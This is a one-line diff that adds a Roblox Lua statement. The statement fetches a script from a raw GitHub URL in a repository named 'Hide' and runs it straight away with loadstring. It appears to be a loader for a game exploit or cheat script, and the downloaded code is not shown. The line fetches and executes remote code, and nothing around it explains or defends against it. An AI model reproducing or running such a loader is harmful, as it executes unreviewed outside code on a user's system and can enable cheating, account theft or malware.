@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/Hide/main/Robots%20%F0%9F%A4%96%20%E2%9A%A0%EF%B8%8F"))()
